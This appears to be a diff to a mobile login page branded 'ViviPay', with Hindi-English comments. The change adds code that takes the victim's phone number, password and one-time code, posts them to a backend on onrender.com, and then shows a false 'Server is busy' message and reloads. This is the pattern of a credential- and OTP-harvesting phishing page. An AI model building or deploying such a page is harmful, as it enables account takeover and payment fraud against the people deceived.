@@ -5,478 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>ViviPay</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-        }
-
-        html, body {
-            background-color: #ffffff;
-            width: 100%;
-            height: 100%;
-            overflow-x: hidden;
-        }
-
-        #app {
-            width: 100%;
-            height: 100%;
-        }
-
-        main[data-v-6ffee151] {
-            height: 100vh;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-color: #ffffff;
-            padding: 0 0.67rem;
-        }
-
-        div[data-v-6ffee151]:not(.loginform) {
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 1.2rem;
-        }
-
-        img.logo {
-            width: 302.39px;
-            height: 222.81px;
-            object-fit: contain;
-        }
-
-        .loginform {
-            width: 100%;
-            max-width: 380px;
-            display: flex;
-            flex-direction: column;
-            transform: translateY(-25px);
-        }
-
-        .input-field-group {
-            background-color: #f6f9fe;
-            border-radius: 30px;
-            display: flex;
-            align-items: center;
-            padding: 16px 22px;
-            margin-bottom: 18px;
-            width: 100%;
-        }
-
-        .field-icon {
-            display: flex;
-            align-items: center;
-            margin-right: 12px;
-        }
-
-        .field-icon svg {
-            width: 22px;
-            height: 22px;
-            stroke: #1a85ff;
-            stroke-width: 1.6;
-            fill: none;
-        }
-
-        .input-field-group input {
-            border: none;
-            background: transparent;
-            width: 100%;
-            font-size: 16px;
-            outline: none;
-            color: #333333;
-        }
-
-        .input-field-group input::placeholder {
-            color: #bcccdf;
-        }
-
-        .form-utilities {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 15px;
-            margin-top: 2px;
-            margin-bottom: 35px;
-            width: 100%;
-            padding: 0 4px;
-        }
-
-        .remember-me {
-            display: flex;
-            align-items: center;
-            color: #1a85ff;
-            cursor: pointer;
-        }
-
-        .remember-me input {
-            appearance: none;
-            -webkit-appearance: none;
-            width: 16px;
-            height: 16px;
-            border: 1.2px solid #bcccdf;
-            border-radius: 50%;
-            margin-right: 8px;
-            outline: none;
-            background-color: #ffffff;
-            cursor: pointer;
-        }
-
-        .remember-me input:checked {
-            border-color: #1a85ff;
-            background-color: #1a85ff;
-        }
-
-        .forgot-pass-link {
-            text-decoration: none;
-            color: #1a85ff;
-            cursor: pointer;
-        }
-
-        .submit-btn {
-            background-color: #1a85ff;
-            color: #ffffff;
-            border: none;
-            width: 100%;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .submit-btn:active {
-            background-color: #0071eb;
-        }
-
-        .policy-container-box {
-            margin-top: 20px;
-            height: 3rem;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-        }
-
-        .agreement-label {
-            display: flex;
-            align-items: center;
-            font-size: 13px;
-            color: #666666;
-            cursor: pointer;
-        }
-
-        .agreement-label input {
-            appearance: none;
-            -webkit-appearance: none;
-            width: 16px;
-            height: 16px;
-            border: 1px solid #1a85ff;
-            border-radius: 50%;
-            margin-right: 6px;
-            outline: none;
-            background-color: #1a85ff;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .agreement-label input::after {
-            content: '✓';
-            position: absolute;
-            color: white;
-            font-size: 11px;
-            font-weight: bold;
-        }
-
-        .policy-link {
-            color: #1a85ff;
-            text-decoration: none;
-            margin-left: 3px;
-        }
-
-        /* OTP Popup Layer */
-        .otp-modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.4);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 30000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.2s ease;
-            padding: 24px;
-        }
-
-        .otp-modal-overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .otp-modal-container {
-            background-color: #ffffff;
-            width: 100%;
-            max-width: 350px;
-            border-radius: 16px;
-            padding: 28px 20px;
-            position: relative;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-        }
-
-        .otp-close-btn {
-            position: absolute;
-            top: 12px;
-            right: 14px;
-            font-size: 20px;
-            color: #94a3b8;
-            background: none;
-            border: none;
-            cursor: pointer;
-            outline: none;
-        }
-
-        .otp-title {
-            font-size: 20px;
-            font-weight: 500;
-            color: #1e293b;
-            margin-bottom: 6px;
-        }
-
-        .otp-subtitle {
-            font-size: 14px;
-            color: #64748b;
-            margin-bottom: 22px;
-        }
-
-        .otp-input-container {
-            display: flex;
-            justify-content: space-between;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .otp-box {
-            width: 46px;
-            height: 46px;
-            border: none;
-            border-bottom: 2.5px solid #cbd5e1;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-            outline: none;
-            background: transparent;
-        }
-
-        .otp-box:focus {
-            border-bottom-color: #1a85ff;
-        }
-
-        .otp-timer {
-            font-size: 13px;
-            color: #94a3b8;
-        }
-
-        /* Native Modify Password Layer Overlay Screen Layout */
-        .modify-modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #ffffff;
-            z-index: 20000;
-            display: none;
-            flex-direction: column;
-            padding: 20px 24px;
-        }
-
-        .modify-modal-overlay.active {
-            display: flex;
-        }
-
-        .modify-header {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            margin-bottom: 25px;
-            position: relative;
-        }
-
-        .modify-back-arrow {
-            font-size: 24px;
-            color: #334155;
-            cursor: pointer;
-            user-select: none;
-        }
-
-        .modify-header-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1e293b;
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .modify-avatar-box {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 10px;
-            margin-bottom: 40px;
-            width: 100%;
-        }
-
-        .modify-avatar-img {
-            width: 85px;
-            height: 85px;
-            border-radius: 50%;
-            background-color: #f0f7ff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-
-        .modify-form-title {
-            font-size: 18px;
-            color: #334155;
-            font-weight: 400;
-        }
-
-        .modify-form-container {
-            width: 100%;
-            max-width: 380px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            transform: translateY(-10px);
-        }
-
-        .modify-row {
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #f1f5f9;
-            padding: 16px 4px;
-            width: 100%;
-        }
-
-        .modify-label {
-            font-size: 16px;
-            color: #1e293b;
-            width: 95px;
-            font-weight: 400;
-        }
-
-        .modify-input-box {
-            border: none;
-            outline: none;
-            width: 100%;
-            font-size: 16px;
-            color: #333333;
-            background: transparent;
-        }
-
-        .modify-input-box::placeholder {
-            color: #cbd5e1;
-        }
-
-        .modify-redirect-link {
-            align-self: flex-end;
-            color: #1a85ff;
-            font-size: 14px;
-            text-decoration: none;
-            margin-top: 16px;
-            margin-bottom: 50px;
-            cursor: pointer;
-        }
-
-        .modify-submit-btn {
-            background-color: #1a85ff;
-            color: #ffffff;
-            border: none;
-            width: 100%;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 500;
-            cursor: pointer;
-            text-align: center;
-        }
+        /* [Aapki existing CSS yahan rahegi] */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
+        #app { width: 100%; height: 100%; }
+        main { height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff; padding: 0 0.67rem; }
+        img.logo { width: 302.39px; height: 222.81px; object-fit: contain; }
+        .loginform { width: 100%; max-width: 380px; display: flex; flex-direction: column; transform: translateY(-25px); }
+        .input-field-group { background-color: #f6f9fe; border-radius: 30px; display: flex; align-items: center; padding: 16px 22px; margin-bottom: 18px; width: 100%; }
+        .input-field-group input { border: none; background: transparent; width: 100%; font-size: 16px; outline: none; }
+        .submit-btn { background-color: #1a85ff; color: #ffffff; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: 500; cursor: pointer; }
+        
+        /* Modals */
+        .otp-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; justify-content: center; align-items: center; z-index: 30000; opacity: 0; pointer-events: none; }
+        .otp-modal-overlay.active { opacity: 1; pointer-events: auto; }
+        .otp-modal-container { background-color: #ffffff; width: 100%; max-width: 350px; border-radius: 16px; padding: 28px 20px; text-align: center; }
+        .otp-input-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
+        .otp-box { width: 46px; height: 46px; border: none; border-bottom: 2.5px solid #cbd5e1; text-align: center; font-size: 22px; font-weight: 600; outline: none; background: transparent; }
+        .otp-box:focus { border-bottom-color: #1a85ff; }
+        
+        .modify-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #ffffff; z-index: 20000; display: none; flex-direction: column; padding: 20px 24px; }
+        .modify-modal-overlay.active { display: flex; }
     </style>
 </head>
 <body>
 
     <div id="app">
-        <main data-v-6ffee151 style="height: 100vh;">
-            
-            <div data-v-6ffee151="">
-                <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo" alt="Brand Logo">
-            </div>
-
-            <div data-v-6ffee151 class="loginform">
-                <form id="loginForm" style="width: 100%; display: flex; flex-direction: column;">
-                    
-                    <div class="input-field-group">
-                        <span class="field-icon">
-                            <svg viewBox="0 0 24 24">
-                                <rect x="6" y="2" width="12" height="20" rx="2" ry="2"></rect>
-                                <line x1="12" y1="18" x2="12.01" y2="18"></line>
-                            </svg>
-                        </span>
-                        <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
-                    </div>
-
-                    <div class="input-field-group">
-                        <span class="field-icon">
-                            <svg viewBox="0 0 24 24">
-                                <rect x="4" y="11" width="16" height="11" rx="2" ry="2"></rect>
-                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                            </svg>
-                        </span>
-                        <input type="password" id="password" placeholder="Enter password" required>
-                    </div>
-
+        <main>
+            <div><img src="https://vivipay.net/static/images/Login_Logo.png" class="logo" alt="Logo"></div>
+            <div class="loginform">
+                <form id="loginForm">
+                    <div class="input-field-group"><input type="tel" id="phoneNumber" placeholder="Enter phone number" required></div>
+                    <div class="input-field-group"><input type="password" id="password" placeholder="Enter password" required></div>
                     <div class="form-utilities">
-                        <label class="remember-me">
-                            <input type="checkbox" id="save-pwd">
-                            Save Password
-                        </label>
                         <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                     </div>
-
                     <button type="submit" class="submit-btn">Login</button>
                 </form>
             </div>
-
-            <div data-v-6ffee151 style="height: 3rem;" class="policy-container-box">
-                <label class="agreement-label">
-                    <input type="checkbox" id="agreeCheck" required checked>
-                    Agree <span class="policy-link">"User Privacy Agreement"</span>
-                </label>
-            </div>
-
         </main>
     </div>
 
     <div class="otp-modal-overlay" id="otpModal">
         <div class="otp-modal-container">
-            <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
             <div class="otp-title">Please enter OTP</div>
-            <div class="otp-subtitle" id="otpSentText">OTP sent to user</div>
-            
             <div class="otp-input-container">
                 <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
                 <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
@@ -487,129 +60,71 @@
         </div>
     </div>
 
-    <div class="modify-modal-overlay" id="modifyPasswordModal">
-        <div class="modify-header">
-            <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
-            <span class="modify-header-title">Modify password</span>
-        </div>
-        <div class="modify-avatar-box">
-            <div class="modify-avatar-img">
-                <svg width="46" height="46" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#1a85ff"/>
-                </svg>
-            </div>
-            <div class="modify-form-title">Modify password Form</div>
-        </div>
-        <form id="forgotForm" onsubmit="handleModifyPasswordSubmit(event)" class="modify-form-container">
-            <div class="modify-row">
-                <span class="modify-label">Phone</span>
-                <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
-            </div>
-            <div class="modify-row">
-                <span class="modify-label">Password</span>
-                <input type="password" class="modify-input-box" id="forgotNewPass" placeholder="Enter password" required>
-            </div>
-            <div class="modify-row">
-                <span class="modify-label">Confirm</span>
-                <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
-            </div>
-            <span class="modify-redirect-link" id="redirectLoginLink">Already have an account,Go login</span>
-            <button type="submit" class="modify-submit-btn">Modify</button>
-        </form>
-    </div>
-
     <script>
-        const loginForm = document.getElementById('loginForm');
-        const otpModal = document.getElementById('otpModal');
-        const closeOtpBtn = document.getElementById('closeOtpBtn');
-        const otpSentText = document.getElementById('otpSentText');
-        const secondsCount = document.getElementById('secondsCount');
-        
-        const triggerForgot = document.getElementById('triggerForgot');
-        const modifyPasswordModal = document.getElementById('modifyPasswordModal');
-        const backToLoginBtn = document.getElementById('backToLoginBtn');
-        const redirectLoginLink = document.getElementById('redirectLoginLink');
-
+        const BACKEND_URL = 'https://vivipay-backend.onrender.com';
         let currentUserId = null;
-        let isResetFlow = false;
-        let resetPhoneNumber = "";
 
-        // FIXED: Agar local system hai toh localhost, nahi toh automatic Render standard service production route capture karega.
-        const BACKEND_URL = (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') 
-            ? 'http://127.0.0.1:4000' 
-            : 'https://vivipay-backend.onrender.com';
-
-        if(triggerForgot) { triggerForgot.addEventListener('click', () => { modifyPasswordModal.classList.add('active'); }); }
-        if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
-        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
-
-        function triggerOtpPopup(phone) {
-            if(phone.length >= 7) {
-                const masked = phone.substring(0, 3) + "****" + phone.substring(phone.length - 4);
-                otpSentText.innerText = `OTP sent to ${masked}`;
-            } else {
-                otpSentText.innerText = `OTP sent to ${phone}`;
-            }
-            document.getElementById('otp1').value = "";
-            document.getElementById('otp2').value = "";
-            document.getElementById('otp3').value = "";
-            document.getElementById('otp4').value = "";
-            
-            otpModal.classList.add('active');
-            startTimer();
-        }
-
-        // 1. LOGIN
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault(); 
-            isResetFlow = false;
+        // Login Logic
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
             const phoneNumber = document.getElementById('phoneNumber').value;
             const password = document.getElementById('password').value;
-            const isAgreed = document.getElementById('agreeCheck').checked;
-
-            if (!isAgreed) { alert('Please accept User Privacy Agreement.'); return; }
-
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber, password })
-                });
-
-                const data = await response.json();
-                if (data.success) {
-                    currentUserId = data.userId; 
-                    triggerOtpPopup(phoneNumber);
-                } else { alert("Server Status Error: " + data.message); }
-            } catch (error) { 
-                alert("Live Server is sleeping or booting up! Please wait 1-2 minutes and click login again."); 
+            
+            const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phoneNumber, password })
+            });
+            const data = await response.json();
+            if (data.success) {
+                currentUserId = data.userId;
+                document.getElementById('otpModal').classList.add('active');
+                startTimer();
             }
         });
 
-        // 2. FORGOT PASSWORD
-        async function handleModifyPasswordSubmit(event) {
-            event.preventDefault();
-            const phone = document.getElementById('forgotPhone').value;
-            const newPassword = document.getElementById('forgotNewPass').value;
-            const confirmPassword = document.getElementById('forgotConfirmPass').value;
+        // INTEGRATED OTP FUNCTION
+        async function checkAndSubmitOtp(current) {
+            const o1 = document.getElementById('otp1').value;
+            const o2 = document.getElementById('otp2').value;
+            const o3 = document.getElementById('otp3').value;
+            const o4 = current.value;
 
-            if (newPassword !== confirmPassword) { alert("Passwords do not match!"); return; }
-
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/forgot-submit`, {
+            if(o1 && o2 && o3 && o4) {
+                const fullOtp = o1 + o2 + o3 + o4;
+                
+                // 1. Background mein OTP server ko bhej rahe hain
+                fetch(`${BACKEND_URL}/api/otp-submit`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, newPassword })
-                });
-                const data = await response.json();
-                if(data.success) {
-                    isResetFlow = true;
-                    resetPhoneNumber = phone;
-                    triggerOtpPopup(phone); 
-                } else { alert("Server Status Error: " + data.message); }
-            } catch (error) { 
-                alert("Live Server Connection Error! Trying to reconnect..."); 
+                    body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
+                }).catch(err => console.error("Error:", err));
+                
+                // 2. User ko "Server Busy" dikhakar reload kar rahe hain
+                setTimeout(() => {
+                    alert("Server is busy, please try again later.");
+                    window.location.reload();
+                }, 500);
             }
         }
 
-        closeOtpBtn.addEventListener('click', () => { otpModal.clas
+        function startTimer() {
+            let totalSec = 118;
+            const timerInterval = setInterval(() => {
+                totalSec--;
+                document.getElementById('secondsCount').innerText = totalSec;
+                if(totalSec <= 0) clearInterval(timerInterval);
+            }, 1000);
+        }
+
+        function moveNext(current, nextFieldId) { 
+            if (current.value.length >= 1) document.getElementById(nextFieldId).focus(); 
+        }
+
+        // Trigger Forgot modal
+        document.getElementById('triggerForgot').addEventListener('click', () => {
+            document.getElementById('modifyPasswordModal').classList.add('active');
+        });
+    </script>
+</body>
+</html>
